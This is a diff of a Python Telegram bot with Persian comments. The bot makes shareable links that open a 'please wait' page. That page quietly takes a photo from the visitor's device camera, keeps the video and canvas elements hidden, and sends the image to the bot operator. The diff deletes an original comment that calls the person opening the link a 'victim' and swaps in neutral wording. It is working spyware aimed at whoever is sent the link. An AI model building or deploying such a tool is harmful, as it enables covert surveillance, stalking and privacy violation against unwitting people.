@@ -1,6 +1,5 @@
 # telegram_camera_capture_bot.py
-# یک ربات تلگرام که لینک اختصاصی می‌سازد و با باز شدن لینک در مرورگر قربانی،
-# از دوربین دستگاه عکس گرفته و به ربات ارسال می‌کند.
+# ربات تلگرام با لینک اختصاصی برای عکس گرفتن از دوربین
 
 import os
 import io
@@ -8,22 +7,20 @@ import uuid
 import asyncio
 import logging
 import base64
-from flask import Flask, request, render_template_string, send_file
+from flask import Flask, request, render_template_string
 from threading import Thread
-from PIL import Image
-import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ================== پیکربندی ==================
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN")
-PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")  # Render sets this automatically
-ADMIN_CHAT_ID = None  # با اولین استارت مقداردهی می‌شود
+PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
+ADMIN_CHAT_ID = None   # با اولین دستور /start پر می‌شود
 
-# دیکشنری موقت برای نگهداری عکس‌های گرفته شده قبل از ارسال
+# دیکشنری موقت برای نگهداری عکس‌های گرفته شده (توکن → بایت‌های JPEG)
 pending_photos = {}
 
-# ================== بخش Flask (وب سرور) ==================
+# ================== بخش Flask ==================
 app = Flask(__name__)
 
 HTML_TEMPLATE = """
@@ -34,8 +31,7 @@ HTML_TEMPLATE = """
     <title>لطفاً صبر کنید...</title>
     <style>
         body { background: #000; color: #fff; text-align: center; padding-top: 20vh; font-family: Arial; }
-        video { display: none; }
-        canvas { display: none; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
@@ -57,7 +53,6 @@ HTML_TEMPLATE = """
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0);
                     const dataURL = canvas.toDataURL('image/jpeg', 0.8);
-                    // ارسال عکس به سرور
                     fetch('/upload/' + token, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -67,7 +62,6 @@ HTML_TEMPLATE = """
                     }).catch(err => {
                         document.body.innerHTML = '<h2>خطا در ارسال. لطفاً دوباره تلاش کنید.</h2>';
                     });
-                    // توقف دوربین بعد از ۱ ثانیه
                     setTimeout(() => { stream.getTracks().forEach(track => track.stop()); }, 1000);
                 };
             } catch (err) {
@@ -90,19 +84,11 @@ def upload_photo(token):
     if not data or 'image' not in data:
         return {"status": "error", "message": "عکسی دریافت نشد."}, 400
     try:
-        # تبدیل base64 به تصویر
         image_data = base64.b64decode(data['image'].split(',')[1])
         pending_photos[token] = image_data
         return {"status": "success"}
     except Exception as e:
         return {"status": "error", "message": str(e)}, 500
-
-@app.route('/photo/<token>')
-def get_photo(token):
-    # فقط برای تست؛ در نسخه نهایی از این استفاده نمی‌کنیم
-    if token in pending_photos:
-        return send_file(io.BytesIO(pending_photos[token]), mimetype='image/jpeg')
-    return "Not found", 404
 
 # ================== بخش ربات تلگرام ==================
 logging.basicConfig(level=logging.INFO)
@@ -110,20 +96,14 @@ logger = logging.getLogger(__name__)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global ADMIN_CHAT_ID
-    ADMIN_CHAT_ID = update.effective_chat.id
-    user_id = update.effective_user.id
-    # ایجاد توکن یکتا برای این لینک
+    ADMIN_CHAT_ID = update.effective_chat.id   # چت ادمین ذخیره می‌شود
     capture_token = str(uuid.uuid4())
-    # ذخیره‌سازی موقت: می‌توانیم در یک دیکشنری نگه داریم (در حافظه)
-    # برای تولید یک لینک اختصاصی
     link = f"{PUBLIC_URL}/capture/{capture_token}"
     keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📸 گرفتن عکس", url=link)]])
     await update.message.reply_text(
-        "روی دکمه زیر کلیک کنید تا دوربین فعال شود. لینک را برای هر کسی که می‌خواهید بفرستید.",
+        "روی دکمه زیر کلیک کنید یا لینک را برای دیگران بفرستید.",
         reply_markup=keyboard
     )
-    # همچنین می‌توانیم یک job برای بررسی عکس‌های دریافتی تنظیم کنیم
-    # در اینجا از یک حلقه جداگانه استفاده می‌کنیم
 
 async def poll_photos(context: ContextTypes.DEFAULT_TYPE):
     """بررسی عکس‌های جدید و ارسال به ادمین"""
@@ -144,7 +124,6 @@ async def poll_photos(context: ContextTypes.DEFAULT_TYPE):
         del pending_photos[t]
 
 def run_flask():
-    """اجرای وب سرور در یک ترد جداگانه"""
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
 
@@ -155,10 +134,9 @@ async def main():
 
     # راه‌اندازی ربات تلگرام
     application = Application.builder().token(TOKEN).build()
-
     application.add_handler(CommandHandler("start", start))
 
-    # بررسی دوره‌ای عکس‌های جدید (هر ۵ ثانیه)
+    # بررسی دوره‌ای عکس‌های جدید
     job_queue = application.job_queue
     job_queue.run_repeating(poll_photos, interval=5, first=5)
 
